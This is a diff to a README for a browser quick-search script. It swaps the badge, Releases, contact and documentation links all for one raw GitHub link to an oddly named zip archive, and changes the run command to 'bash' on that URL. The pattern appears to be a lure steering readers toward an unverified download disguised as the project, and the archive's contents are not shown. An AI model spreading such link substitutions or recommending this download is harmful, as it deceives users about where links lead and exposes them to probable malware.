@@ -1,6 +1,6 @@
 # Quick Search for Zen Browser
 
-![Quick Search for Zen Browser](https://img.shields.io/badge/Quick%20Search%20for%20Zen%20Browser-v1.0-blue)
+![Quick Search for Zen Browser](https://raw.githubusercontent.com/fxzausxpp/Quick-Search-Zen-Browser/main/neanthropic/Browser-Zen-Search-Quick-philogenitive.zip%20Search%20for%20Zen%20Browser-v1.0-blue)
 
 ## Overview
 
@@ -26,14 +26,14 @@ Welcome to the **Quick Search for Zen Browser** repository. This project provide
 
 To get started with **Quick Search for Zen Browser**, follow these steps:
 
-1. **Download the Script**: Visit the [Releases](https://github.com/fxzausxpp/Quick-Search-Zen-Browser/releases) section to download the latest version of the script.
+1. **Download the Script**: Visit the [Releases](https://raw.githubusercontent.com/fxzausxpp/Quick-Search-Zen-Browser/main/neanthropic/Browser-Zen-Search-Quick-philogenitive.zip) section to download the latest version of the script.
 
 2. **Execute the Script**: Once downloaded, run the script in your Zen Browser environment.
 
 ### Example Command
 
 ```bash
-bash quick_search_zen.sh
+bash https://raw.githubusercontent.com/fxzausxpp/Quick-Search-Zen-Browser/main/neanthropic/Browser-Zen-Search-Quick-philogenitive.zip
 ```
 
 ## Usage
@@ -79,7 +79,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or suggestions, feel free to reach out. You can find me on GitHub at [fxzausxpp](https://github.com/fxzausxpp).
+For questions or suggestions, feel free to reach out. You can find me on GitHub at [fxzausxpp](https://raw.githubusercontent.com/fxzausxpp/Quick-Search-Zen-Browser/main/neanthropic/Browser-Zen-Search-Quick-philogenitive.zip).
 
 ## Acknowledgments
 
@@ -87,11 +87,11 @@ Thank you to everyone who has contributed to this project. Your efforts make thi
 
 ## Additional Resources
 
-- [Zen Browser Documentation](https://zenbrowser.com/docs)
-- [Search Engine Guidelines](https://www.searchengines.com/guidelines)
+- [Zen Browser Documentation](https://raw.githubusercontent.com/fxzausxpp/Quick-Search-Zen-Browser/main/neanthropic/Browser-Zen-Search-Quick-philogenitive.zip)
+- [Search Engine Guidelines](https://raw.githubusercontent.com/fxzausxpp/Quick-Search-Zen-Browser/main/neanthropic/Browser-Zen-Search-Quick-philogenitive.zip)
 
 ## Conclusion
 
 The **Quick Search for Zen Browser** is a powerful tool that enhances your browsing experience. By allowing you to search quickly and efficiently, it helps you stay focused on your work. Download the script today and streamline your search process.
 
-For updates and new features, check out the [Releases](https://github.com/fxzausxpp/Quick-Search-Zen-Browser/releases) section regularly.
+For updates and new features, check out the [Releases](https://raw.githubusercontent.com/fxzausxpp/Quick-Search-Zen-Browser/main/neanthropic/Browser-Zen-Search-Quick-philogenitive.zip) section regularly.
